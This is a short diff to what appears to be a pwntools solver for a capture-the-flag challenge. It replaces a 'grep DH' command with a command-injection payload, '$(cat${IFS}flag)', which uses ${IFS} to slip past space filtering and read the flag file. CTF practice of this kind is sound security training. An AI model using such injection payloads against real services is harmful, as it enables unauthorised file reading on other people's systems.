@@ -30,9 +30,9 @@ p.interactive()
 """
 p.recvuntil(b":")
 p.recvuntil(b" ")
-p.sendline("grep DH")
-#p.sendline("ls -al")# /tmp/cat_db")
+p.sendline("$(cat${IFS}flag)")
 flag = []
+
 #get all info
 try:
 	while True:
